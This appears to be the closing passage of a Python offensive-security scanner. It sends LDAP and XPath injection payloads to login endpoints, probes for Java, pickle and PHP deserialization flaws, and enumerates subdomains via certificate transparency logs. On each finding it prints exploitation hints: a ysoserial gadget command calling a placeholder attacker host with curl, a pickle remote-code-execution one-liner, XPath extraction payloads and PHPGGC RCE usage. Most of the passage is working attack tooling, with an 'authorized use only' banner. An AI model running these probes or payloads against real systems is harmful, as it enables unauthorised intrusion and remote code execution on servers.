            if s == 200 and any(x in str(d) for x in ("token", "user", "success", "admin")):
                hit(state, f"LDAP injection — auth bypass ({label}) on {path}",
                    f"username={payload!r} → HTTP {s}",
                    json.dumps(d)[:150], path, CRIT)
                nexts("Blind LDAP: enumerate attributes via boolean-based: *(attribute=a*), *(attribute=b*)...")
                state.caps.add("ldap_injection")
                break

    step("XPath injection probes")
    for path in login_paths:
        for payload in XPATH_PAYLOADS:
            s, d, _, raw = await state.http.r("POST", path,
                                               body={"username": payload,
                                                     "password": "x"})
            if s == 200 and any(x in str(d) for x in ("token", "user", "success")):
                hit(state, f"XPath injection on {path}",
                    f"Payload {payload!r} → HTTP {s}",
                    json.dumps(d)[:150], path, CRIT)
                nexts("Dump all XML nodes: ' or 1=1 or ''='")
                nexts("Extract data char by char with: substring(password,1,1)='a'")
                state.caps.add("xpath_injection")
                break


# ═══════════════════════════════════════════════════════════════════════════════
# 13. DESERIALIZATION DETECTION
# ═══════════════════════════════════════════════════════════════════════════════

JAVA_SERIAL_MAGIC = base64.b64encode(b"\xac\xed\x00\x05").decode()
PICKLE_MAGIC = base64.b64encode(b"\x80\x04\x95").decode()
PHP_SERIAL = 'O:8:"stdClass":0:{}'


async def check_deserialization(state: State):
    hdr("13. DESERIALIZATION DETECTION")

    deser_paths = [
        "api/v1/data", "api/v1/import", "api/v1/restore",
        "api/v1/session", "api/v1/object", "api/v1/deserialize",
    ]

    for path in deser_paths:
        s, d, _, raw = await state.http.r("POST", path,
                                           raw_body=base64.b64decode(JAVA_SERIAL_MAGIC + "A" * 20),
                                           content_type="application/octet-stream",
                                           token=state.token)
        if s in (200, 500) and any(x in raw for x in
                                   ("ClassNotFoundException", "java.lang", "serializ",
                                    "readObject", "ysoserial")):
            hit(state, f"Java deserialization endpoint: {path}",
                f"Server returned Java serialization error",
                raw[:200], path, CRIT)
            nexts("Payload: java -jar ysoserial.jar CommonsCollections6 'curl attacker.com' | base64")
            nexts("Gadget chains: CommonsCollections, Spring, Groovy, JDK7u21")
            state.caps.add("java_deser")

        s, d, _, raw = await state.http.r("POST", path,
                                           raw_body=b"\x80\x04\x95" + b"A" * 10,
                                           content_type="application/octet-stream",
                                           token=state.token)
        if s in (200, 500) and any(x in raw for x in
                                   ("pickle", "Unpickling", "module", "__reduce__")):
            hit(state, f"Python pickle deserialization: {path}",
                "Server returned pickle-related error",
                raw[:200], path, CRIT)
            nexts("RCE: import pickle,os; class E: __reduce__=lambda s:(os.system,('id',)); pickle.dumps(E())")
            state.caps.add("pickle_deser")

        s, d, _, raw = await state.http.r("POST", path,
                                           raw_body=PHP_SERIAL.encode(),
                                           content_type="application/x-www-form-urlencoded",
                                           token=state.token)
        if s in (200, 500) and any(x in raw for x in
                                   ("unserialize", "__wakeup", "__destruct",
                                    "stdClass", "Serializable")):
            hit(state, f"PHP deserialization: {path}",
                "Server processed PHP serialized object",
                raw[:200], path, CRIT)
            nexts("PHPGGC tool: phpggc <framework> RCE exec 'id'")
            state.caps.add("php_deser")


# ═══════════════════════════════════════════════════════════════════════════════
# 14. CERTIFICATE TRANSPARENCY / SUBDOMAIN ENUM
# ═══════════════════════════════════════════════════════════════════════════════

async def check_subdomains(state: State):
    hdr("14. CERTIFICATE TRANSPARENCY — SUBDOMAIN ENUMERATION")

    domain = urlparse(state.base).hostname
    if not domain or domain in ("localhost", "127.0.0.1"):
        info("Localhost target — skipping CT subdomain enum")
        return

    step(f"Querying crt.sh for {domain}")
    try:
        ct_url = f"https://crt.sh/?q=%.{domain}&output=json"
        async with state.http.session.get(ct_url, ssl=True,
                                           timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                subdomains = set()
                for entry in data:
                    name = entry.get("name_value", "")
                    for sub in name.split("\n"):
                        sub = sub.strip().lstrip("*.")
                        if sub.endswith(domain) and sub != domain:
                            subdomains.add(sub)

                ok(f"Found {len(subdomains)} subdomains via CT logs")
                for sub in sorted(subdomains)[:20]:
                    loot(f"  {sub}")
                if len(subdomains) > 20:
                    info(f"  ... and {len(subdomains)-20} more")

                interesting = [s for s in subdomains if any(
                    x in s for x in ("api", "dev", "staging", "test", "admin",
                                      "internal", "vpn", "beta", "old", "legacy",
                                      "backup", "db", "mail", "git", "jenkins",
                                      "jira", "confluence", "grafana", "kibana"))]
                if interesting:
                    loot(f"High-value subdomains: {interesting}")
                    hit(state, f"Interesting subdomains via CT ({len(interesting)})",
                        "dev/staging/admin subdomains may have weaker security",
                        str(interesting[:5]), f"crt.sh/{domain}", "HIGH")
                    nexts("Test each subdomain with full scanner")
                    nexts("Check for subdomain takeover: dig <sub> → NXDOMAIN on CNAME target")
                    state.caps.add("subdomains")
    except Exception as e:
        info(f"CT query failed: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

async def run_advanced(base: str, token: Optional[str] = None):
    connector = aiohttp.TCPConnector(ssl=False, limit=30)
    async with aiohttp.ClientSession(connector=connector) as session:
        http = HTTP(base, session)
        state = State(http=http, base=base, token=token)

        start = time.monotonic()

        checks = [
            check_race_conditions,
            check_nosql_injection,
            check_ssti,
            check_xxe,
            check_request_smuggling,
            check_jwt_confusion,
            check_uuid_idor,
            check_js_sourcemaps,
            check_host_header,
            check_oauth,
            check_cache_poisoning,
            check_injection_other,
            check_deserialization,
            check_subdomains,
        ]

        for fn in checks:
            try:
                await fn(state)
            except Exception as e:
                warn(f"{fn.__name__} error: {e}")

        elapsed = time.monotonic() - start

        hdr("ADVANCED TECHNIQUES SUMMARY")
        sev_order = [CRIT, "HIGH", "MEDIUM", "LOW", "INFO"]
        for sev in sev_order:
            items = [f for f in state.findings if f["sev"] == sev]
            if items:
                c = RD if sev in (CRIT, "HIGH") else YL
                print(f"  {c}{BD}{sev} ({len(items)}){R}")
                for f in items:
                    print(f"    • {f['title']}")
        print(f"\n  Capabilities confirmed: {state.caps}")
        print(f"  Elapsed: {elapsed:.1f}s\n")

        return state.findings


def main():
    import argparse
    p = argparse.ArgumentParser(
        description="Advanced techniques scanner — authorized testing only.")
    p.add_argument("url", help="Target base URL (e.g. http://127.0.0.1:7777)")
    p.add_argument("-t", "--token", default=None, help="Bearer token if already authenticated")
    args = p.parse_args()

    if urlparse(args.url).scheme not in ("http", "https"):
        print("Invalid URL")
        sys.exit(1)

    print("\n⚠  AUTHORIZED USE ONLY\n")
    asyncio.run(run_advanced(args.url, token=args.token))


if __name__ == "__main__":
    main()
